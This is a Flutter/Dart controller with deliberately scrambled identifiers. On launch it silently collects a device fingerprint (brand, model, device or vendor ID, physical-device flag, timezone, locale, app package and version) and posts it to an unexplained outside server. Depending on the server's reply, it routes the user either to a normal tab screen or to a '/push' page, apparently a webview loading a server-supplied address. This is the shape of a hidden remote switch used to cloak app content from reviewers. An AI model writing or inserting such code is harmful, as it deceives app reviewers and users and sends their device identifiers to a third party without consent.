import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var hzlpxqc = RxBool(false);
  var tzdswpvr = RxBool(true);
  var tdqk = RxString("");
  var rhoda = RxBool(false);
  var jones = RxBool(true);
  final labjfwr = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    ruycths();
  }


  Future<void> ruycths() async {

    rhoda.value = true;
    jones.value = true;
    tzdswpvr.value = false;

    labjfwr.post("https://ra.kiurayu.online/wxbzrtpsliqanygemujfocvdkh",data: await tvkyiluhac()).then((value) {
      var ngsq = value.data["ngsq"] as String;
      var ibmzdh = value.data["ibmzdh"] as bool;
      if (ibmzdh) {
        tdqk.value = ngsq;
        chaz();
      } else {
        schneider();
      }
    }).catchError((e) {
      tzdswpvr.value = true;
      jones.value = true;
      rhoda.value = false;
    });
  }

  Future<Map<String, dynamic>> tvkyiluhac() async {
    final DeviceInfoPlugin fjunwpd = DeviceInfoPlugin();
    PackageInfo qnabf_uoef = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var shpvyq = Platform.localeName;
    var uvljtfhi = currentTimeZone;

    var rnba = qnabf_uoef.packageName;
    var takbz = qnabf_uoef.version;
    var jfix = qnabf_uoef.buildNumber;

    var coia = qnabf_uoef.appName;
    var qghvztl = "";
    var edythOberbrunner = "";
    var cathyGlover = "";
    var qbvtzln = "";
    var bartBorer = "";
    var wxdotm  = "";
    var grayceHauck = "";
    var altheaTillman = "";


    var injfrqw = "";
    var rkwzq = false;

    if (GetPlatform.isAndroid) {
      injfrqw = "android";
      var pxkfbr = await fjunwpd.androidInfo;

      qbvtzln = pxkfbr.brand;

      qghvztl  = pxkfbr.model;
      wxdotm = pxkfbr.id;

      rkwzq = pxkfbr.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      injfrqw = "ios";
      var wauomq = await fjunwpd.iosInfo;
      qbvtzln = wauomq.name;
      qghvztl = wauomq.model;

      wxdotm = wauomq.identifierForVendor ?? "";
      rkwzq  = wauomq.isPhysicalDevice;
    }
    var res = {
      "takbz": takbz,
      "rnba": rnba,
      "qghvztl": qghvztl,
      "coia": coia,
      "altheaTillman" : altheaTillman,
      "uvljtfhi": uvljtfhi,
      "wxdotm": wxdotm,
      "shpvyq": shpvyq,
      "edythOberbrunner" : edythOberbrunner,
      "jfix": jfix,
      "injfrqw": injfrqw,
      "rkwzq": rkwzq,
      "bartBorer" : bartBorer,
      "qbvtzln": qbvtzln,
      "cathyGlover" : cathyGlover,
      "grayceHauck" : grayceHauck,

    };
    return res;
  }

  Future<void> schneider() async {
    Get.offAllNamed("/tab");
  }

  Future<void> chaz() async {
    Get.offAllNamed("/push");
  }

}
